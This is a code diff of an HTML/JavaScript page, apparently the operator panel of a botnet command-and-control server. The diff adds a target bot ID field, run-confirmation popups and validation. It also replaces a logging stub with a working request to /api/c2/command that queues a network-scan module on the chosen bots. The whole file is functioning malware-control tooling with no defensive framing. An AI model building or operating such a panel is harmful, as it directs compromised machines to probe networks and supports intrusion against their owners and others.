@@ -10,23 +10,122 @@
     <h1>Network Scanner</h1>
     <div class="panel">
         <h2>Parameters</h2>
+        <input type="text" id="targets" placeholder="Target bot IDs (comma separated)">
         <input type="text" id="subnet" placeholder="Subnet (e.g., 192.168.1.0/24)">
         <input type="text" id="ports" placeholder="Ports (comma-separated, e.g., 80,443,8080)">
-        <button onclick="execute()">Scan Network</button>
+        <button onclick="startNetworkScan()">Start Scan</button>
     </div>
     <div class="panel">
         <h2>Output</h2>
         <div id="output"></div>
     </div>
+    <div id="popup" class="popup hidden">
+        <div class="popup-content">
+            <p id="popup-message"></p>
+            <button onclick="closePopup()">Close</button>
+        </div>
+    </div>
+    <div id="run-popup" class="popup hidden">
+        <div class="popup-content">
+            <h3>Prepare to Run</h3>
+            <p id="run-popup-message"></p>
+            <p id="run-popup-feedback"></p>
+            <button onclick="triggerRunFromPopup()">Run</button>
+            <button onclick="closeRunPopup()">Cancel</button>
+        </div>
+    </div>
     <script>
+        const popup = document.getElementById('popup');
+        const popupMessage = document.getElementById('popup-message');
+        const runPopup = document.getElementById('run-popup');
+        const runPopupMessage = document.getElementById('run-popup-message');
+        const runPopupFeedback = document.getElementById('run-popup-feedback');
+        let pendingRunAction = null;
+
+        function showPopup(message, isError = false) {
+            popupMessage.textContent = message;
+            popup.classList.remove('hidden');
+            popup.classList.toggle('error', isError);
+        }
+
+        function closePopup() {
+            popup.classList.add('hidden');
+            popup.classList.remove('error');
+        }
+
+        function openRunPopup(message, action) {
+            pendingRunAction = action;
+            runPopupMessage.textContent = message || 'Click Run to execute this command.';
+            runPopupFeedback.textContent = '';
+            runPopup.classList.remove('hidden');
+        }
+
+        function closeRunPopup() {
+            runPopup.classList.add('hidden');
+            pendingRunAction = null;
+        }
+
+        function triggerRunFromPopup() {
+            if (typeof pendingRunAction === 'function') {
+                const timestamp = new Date().toLocaleTimeString();
+                runPopupFeedback.textContent = 'Run button clicked at ' + timestamp + '.';
+                alert('Run button clicked at ' + timestamp + '.');
+                const action = pendingRunAction;
+                closeRunPopup();
+                action();
+            }
+        }
+
+        function startNetworkScan() {
+            openRunPopup('Ready to launch the network scan.', execute);
+        }
+
+        function parseTargets() {
+            return document.getElementById('targets').value
+                .split(',')
+                .map(v => v.trim())
+                .filter(Boolean);
+        }
+
         function execute() {
+            const targets = parseTargets();
+            if (!targets.length) {
+                showPopup('Please specify at least one target bot ID.', true);
+                return;
+            }
+
+            const subnet = document.getElementById('subnet').value.trim();
+            if (!subnet) {
+                showPopup('Subnet is required.', true);
+                return;
+            }
+
             const portsRaw = document.getElementById('ports').value;
-            const params = {
-                subnet: document.getElementById('subnet').value,
-                ports: portsRaw.split(',').map(p => parseInt(p.trim()))
-            };
-            // Send command to C2 server
-            console.log('Executing with params:', params);
+            const ports = portsRaw
+                .split(',')
+                .map(p => parseInt(p.trim(), 10))
+                .filter(v => !Number.isNaN(v));
+
+            fetch('/api/c2/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    targets,
+                    command: JSON.stringify({
+                        module: 'network_scan',
+                        params: { subnet, ports },
+                    }),
+                }),
+            })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'ok') {
+                        showPopup('Network scan queued for ' + targets.join(', '));
+                    } else {
+                        showPopup('C2 rejected command: ' + (data.message || 'unknown error'), true);
+                    }
+                })
+                .catch(err => showPopup('Failed to send command: ' + err, true));
         }
     </script>
 </body>
